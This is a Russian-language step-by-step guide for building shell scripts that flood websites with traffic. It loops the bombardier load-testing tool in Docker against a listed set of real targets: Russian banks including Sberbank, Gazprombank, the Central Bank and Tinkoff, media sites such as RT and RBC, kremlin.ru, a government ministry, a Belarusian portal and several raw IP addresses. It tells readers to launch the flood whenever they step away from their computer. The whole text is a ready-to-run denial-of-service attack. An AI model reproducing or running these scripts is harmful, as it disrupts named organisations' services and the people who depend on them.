1. vim run.sh
1. вставляем текст:
   ```
   #!/bin/sh
   for i in {1..1000}; do sudo docker run -it alpine/bombardier -c 1000 -d 60s -l $1 && sleep 5; done
   ```
1. chmod 777 run.sh
1. vim bombard.sh
1. вставляем текст:
   ```
   #!/bin/sh
   screen -d -m -S sb bash -c './run.sh https://www.sberbank.ru'
   screen -d -m -S sb bash -c './run.sh https://www.sberbank.ru'
   screen -d -m -S ssoc bash -c './run.sh https://stories-stat.online.sberbank.ru'
   screen -d -m -S cos bash -c './run.sh https://clickstream.online.sberbank.ru'
   screen -d -m -S sos bash -c './run.sh https://stat.online.sberbank.ru'
   screen -d -m -S cr bash -c './run.sh http://cbr.ru/'
   screen -d -m -S ag bash -c './run.sh https://admin.gazprombank.ru/'
   screen -d -m -S rbc bash -c './run.sh https://www.rbc.ru/'
   screen -d -m -S rbc1 bash -c './run.sh http://185.72.229.13'
   screen -d -m -S rbc2 bash -c './run.sh http://80.68.253.13'
   screen -d -m -S rbc3 bash -c './run.sh http://80.68.253.3'
   screen -d -m -S rbc4 bash -c './run.sh http://185.72.229.3'
   screen -d -m -S rt bash -c './run.sh https://www.rt.com'
   screen -d -m -S rt1 bash -c './run.sh http://185.79.236.172'
   screen -d -m -S rt2 bash -c './run.sh http://89.191.237.172'
   screen -d -m -S kr bash -c './run.sh http://kremlin.ru'
   screen -d -m -S mchs bash -c './run.sh https://www.mchs.gov.ru'
   screen -d -m -S kw bash -c './run.sh https://krym-webcams.ru'
   screen -d -m -S cm bash -c './run.sh http://crimea-media.ru'
   screen -d -m -S ob bash -c './run.sh https://onliner.by'
   screen -d -m -S ti bash -c './run.sh https://tinkoff.ru'
   screen -d -m -S se bash -c './run.sh https://sevstar.net'
   screen -d -m -S bi bash -c './run.sh https://bitzlato.com'
   screen -d -m -S sh bash -c './run.sh https://shop-rt.com'
   ```
1. chmod 777 bombard.sh
1. ./bombard.sh
1. Запускаем `htop`, радуемся картинке

Теперь каджый раз, когда вы отходите от компа просто запустите `./bombard.sh`
